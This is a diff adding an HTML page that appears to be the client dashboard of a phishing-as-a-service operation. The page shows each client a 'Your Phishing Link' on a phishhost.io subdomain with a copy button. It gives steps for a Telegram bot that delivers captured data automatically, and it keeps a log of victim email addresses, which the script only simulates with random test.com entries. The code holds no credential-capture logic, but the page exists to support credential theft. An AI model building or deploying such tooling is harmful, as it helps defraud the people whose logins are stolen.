@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body{font-family:Arial;margin:15px;background:#f5f5f5;}
+        .card{background:white;padding:20px;margin:10px 0;border-radius:10px;box-shadow:0 2px 5px rgba(0,0,0,0.1);}
+        input{width:100%;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:5px;}
+        button{background:#42b549;color:white;border:none;padding:12px;width:100%;border-radius:5px;font-weight:bold;}
+        .stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>👋 Welcome, <span id="clientId">CLIENT001</span></h2>
+        <div class="stats">
+            <div>📊 Today: <span id="today">0</span></div>
+            <div>💰 Plan: <span id="plan">BASIC</span></div>
+        </div>
+    </div>
+    
+    <div class="card">
+        <h3>🔗 Your Phishing Link</h3>
+        <input type="text" id="phishLink" readonly value="Loading...">
+        <button onclick="copyLink()">📋 Copy Link</button>
+    </div>
+    
+    <div class="card">
+        <h3>🤖 Telegram Setup</h3>
+        <p>1. Add <code id="botName">@Client001_bot</code></p>
+        <p>2. Send <code>/start</code></p>
+        <p>3. Data will arrive automatically</p>
+    </div>
+    
+    <div class="card">
+        <h3>📈 Recent Activity</h3>
+        <div id="activityLog">No activity yet</div>
+    </div>
+    
+    <script>
+    // Get client ID from URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const clientId = urlParams.get('id') || 'CLIENT001';
+    
+    // Update display
+    document.getElementById('clientId').textContent = clientId;
+    document.getElementById('phishLink').value = `https://${clientId}.phishhost.io`;
+    document.getElementById('botName').textContent = `@${clientId}_bot`;
+    
+    // Simple localStorage for demo
+    let activity = JSON.parse(localStorage.getItem(`activity_${clientId}`) || '[]');
+    
+    function updateActivity() {
+        document.getElementById('activityLog').innerHTML = 
+            activity.slice(-5).map(a => `<div>${a.time}: ${a.email}</div>`).join('');
+    }
+    
+    // Simulate new data
+    setInterval(() => {
+        if (Math.random() > 0.7) {
+            activity.push({
+                time: new Date().toLocaleTimeString(),
+                email: `user${Math.floor(Math.random()*1000)}@test.com`
+            });
+            localStorage.setItem(`activity_${clientId}`, JSON.stringify(activity));
+            updateActivity();
+        }
+    }, 5000);
+    
+    updateActivity();
+    </script>
+</body>
+</html>
